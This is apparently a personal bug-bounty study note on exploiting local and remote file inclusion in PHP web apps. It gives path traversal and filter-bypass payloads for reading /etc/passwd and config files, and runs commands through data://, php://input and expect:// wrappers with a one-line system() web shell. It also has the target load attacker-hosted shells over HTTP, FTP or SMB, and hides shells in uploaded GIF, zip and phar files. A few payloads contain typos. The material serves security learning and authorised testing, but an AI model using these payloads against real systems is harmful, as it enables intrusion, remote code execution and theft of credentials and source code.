---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounties/local-file-inclusion/","tags":["commonReadableFiles"]}
---

## Basic LFI
The given example is selecting language. On many web pages, the site will let you choose a language. Of the many ways to provide content in multiple languages is to use a template and have it pull the content in other languages into the template from another file. If that's the case, we can try pulling common readable files such as `/etc/passswd` or `C:\Windows\boot.ini` and see if they get read.

To test, we just try and put one of those files into the spot for the language selection.

## Path Traversal
Often we'll have to traverse the directory because the web developers will prepend a string to the parameter. So for languages it might be:
```php
include("./languages/" . $_GET['language']);
```
If we attempt to read `/etc/passwd` then the server will try to fetch `./languages//etc/passwd` and then barf.

So our path will need to add `../` as many times as we need to go back up to the root directory. We can add as many `../` as necessary to get back to the root path and even more if we're not sure how far we are from root.

### FIlename Prefix
When the developer has aded a prefix to the path like so:
```php
include("lang_" . $_GET['language']);
```
Then our request will be invalid because it will be `lang_../../../` In that case, we can try adding `/` as the first character to make it think of the prefix as a directory that we'll just traverse past anyway. (This might not always work.)

### Appended Extensions
It is common to have the web deeloper append the extension tot he language parameter:
```php
include($_GET['language'] . ".php");
```

More here: [[Cybersecurity/Bug Bounties/LFI - Appended Extensions\|LFI - Appended Extensions]]

### Second Order Attacks
In these attacks we poison a database with a malicious LFI payload when we're able to upload.  For example, we craft a malicious LFI username like `../../../etc/passwd` then when the server tries to pull something with our username it triggers the LFI payload instead.

## Basic Bypasses

### Non-Recursive Path Traversal Filters
Sometimes the server will be set to replace `../` with with empty space (i.e., remove them.) In this case, if it is not removing recursively then we can simply input `....//` everywhere we'd normally put `../` and the attack should still work. We might use: `....//....//....//etc/passwd`

In other cases we can try  `..././` or `....\/`

### Encoding
We can also try url encoding. But note taht for this to work we must RL encode all the characters including the dots.  Some URL encoders may not encode dots.

### Approved Paths
Some web apps will use RegEx to make sure that the file included is under a specific path. To circumvent this, find the path that is approved by examing the existing forms and web functionality. Then start our payload witht he approved path and traverse back up again. Something like: `./languages/../../../../etc/passwd`

### Appended Extension
There are some ways of dealing with PHP extensions appended, but they are `obsolete with modern versions of PHP and work only with versions before 5.3/5.4`.

#### Path truncation
Earlier versions of PHP have a character limit of 4096. The excess will get truncated. Therefore we make our path: `non_existing_directory/../../../../etc/passwd/././././[./ REPEATED~2048 times]`
Essentially, we fill up the remainder with current directory (`./`) characters then when the servers adds `.php` it just gets truncated and the path becomes the path we're interested in with a bunch of current directory instructions.

#### Null Bytes
PHP versions before 5.5 were vullnerable to `null byte injection` which means adding a null byte (`%00`) to the dn of the string to terminate the string. We would make our string `/etc/passwd%00` so that the final path is `/etc/passwd/%00.php` but the `.php` gets removed because of how the way strings are handled in Assmebly, C, or C++.
## PHP Filters
If we find an LFI in a PHP application, we can use <a href="https://www.php.net/manual/en/wrappers.php.php">php wrappers</a>. These wrappers allow us to access different I/O streams at the application level.

### Input Filters

<a href="https://www.php.net/manual/en/filters.php">PHP Filters</a> are a type of PHP wrappers that we can pass input into and have it filtered by the filter we specify. We use the `php://` scheme in our string and access the filter wrapper with `php://filter/`.

Two important parameters for the filter wrapper are `resource` and `read`. The `resource` parameter is required and we use it to speify the stream we would like to apply to the filter.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php).

The filter that is most useful for LFI attacks is the `convert.base64-encode` filter.

### Fuzzing for PHP Files
first we find PHP pages with something like ffuf or gobuster. When scanning, we're looking for any files that end with php because we're looking for Local File Inclusion. It doesn't matter if we can't access it from the outside, the point is to exploit the existence of the file.

#### Standard PHP inclusion
If we try to include the PHP file directly using LFI, we don't get anything because the PHP file gets executed and rendered only if there is HTML to be rendered. 

Usually, we're most interested in reading the actual contents of the PHP file not executing it. In this case, the base64 php filter is very helpful since we can encode the php file and then read it.

#### Source Code Disclosure

Once we have a list of potential PHP files we want to read we disclose their sources with the base64 PHP filter. Example:
```url
php://filter/read=convert.base64-encode/resource=config
```


## Remote Code Execution

### PHP Wrappers
One easy way to gain control over the back-end server is to use the LFI to get user credentials and SSH keys and then use those to login to the back-end. These are the no-brainers.

### Data Wrapper

The <a href="https://www.php.net/manual/en/wrappers.data.php">data</a> wrapper can be used to include external data, including PHP code but the data warpper is only available if the `allow_url_include` setting is enabled in the PHP configurations.

Check the PHP configuration file. It's at `/etc/php/X.Y/apache2/php.ini` for Apache or `/etc/php/X.Y/fpm/php.ini` for Nginx, where X.Y is your install PHP version. These files must be encoded using base64 to avoid breaking.

Pull the File:
```shell-session
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Then check the variable state:
```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

Many web applications require this 'On' to function properly. So it's not crazy to see it turned on. We must know how to check. Now we base encode a basic shell:
```shell-session
$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now we use that with our `cmd` we want to execute:
```shell-session
 curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

### Input Wrapper

The <a href="https://www.php.net/manual/en/wrappers.php.php">input</a> wrapper can be used to include external input and execute PHP code also. We pass input to the the `input` wrapper as a post request, so the vulenrable parametr must accept post attacks for this to work. This wrapper also depends on the `allow_url_include` setting.

We send our web shell as a post data to a post request and then our id command as a GET request.

```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

#### Expect Wrapper
The <a href="https://www.php.net/manual/en/wrappers.expect.php">expect</a> wrapper allows us to directly run commands through URL streams. It relys on the expect external wrapper is installed. We look for that the same way we looked for the `allow_url_include` earlier but grep for "expect".

For this we just use the `expect://` wrapper and include our command.
```shell-session
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Remote File Inclusion
We can include remote files if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits.

1. Enumerating local-only ports and web applications.
2. Gaining remote code execution by including a malicious script that we host.

### Local vs. Remote File Inclusion
Anything that is generally a remote file inclusion is also an LFI but not always vice versa. Also, some functions allow remote URLs but not remote execution.

### Verify RFI
Including remote URLs is generally considered dangerous and remote URL inclusion is usually disabled by default. And sometimes when `allow_url_include` is on there still isn't remote URL inclusion.

The most reliable way to test is to try and include a URL. Start with a local URL to assure that the attempt doesn't get blocked by a firewall or some other measuer. `http://127.0.0.1:80/index.php` is a good start.

If the home web page renders then it's a good indication that the application allows remote urls and that the remote code will get executed and rendered as PHP.

### Remote Code Execution with RFI

We can then execute through HTTP or FTP.

#### HTTP
We make our shell and put it on our machine.
```shell-session
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Start a web server:
```shell-session
sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

Then we insert our website and the command into the vulnerable parameter:
```
http://TGTIP:TGTPORT/index.php?language=http://OURIP:LISTENING PORT:/shell.php&cmd=id
```

#### FTP
This may be usefule where there is a firewall blocking HTTP ports

Again we have our shell as before. Set up an FTP Server:
```shell-session
sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

Have the target system connect:
```
http://TGTIP:TGTPORT/index.php?language=ftp://OURIP/shell.php&cmd=id
```


#### SMB
If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
```shell-session
impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

We use: `http://SERVER:PORT/index.php?language=\\ourIP\shell.php&cmd=whoami`
## LFI and File Uploads

In this kind of attack we don't need the file upload form to be vulnerable, we just need to upload the file. If the vulnerable function has `Execute` capabilities then the code within the file will get executed if we include it.

### Image upload

Image upload is very common. The vulnerability here is in the file inclusion functionality.

#### Crafting malicious Image
We want to create a shell that is in a gif image. We need the first few bytes to be GIF8, since this can be in text, we do:
`echo 'GIF8<?php system(["cmd"]); ?>' >shell.gif`
We upload this file to the avatar upload. Then we need to know the path to our image. We may be able to get this by inspecting the source code and getting it from the URL.

Now we just browse to our image:
`http://SERVERIP:PORT/index.php?language=./profile_images/shell.gif&cmd=id`

### Zip Upload

First we zip a shell into a file labeled shell.jpg.
```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
Then we upload the shell.jpg archive as before. Then we access it using the zip wrapper and while referring to the files within it as \#filename (url encode the '\#'). In our case \#shell.php.

`http://SERVERIP:PORT/index.php?language=./profile_images/shell.jpg%23shell.php&cmd=id`

### Phar Upload

Using the phar:// wrapper.
Make this shell.php file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
```shell-session
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Upload, then call it:
`http://SERVERIP:PORT/index.php?language=har://./profile_images/shell.jpg%2Fshell.text&cmd=id`
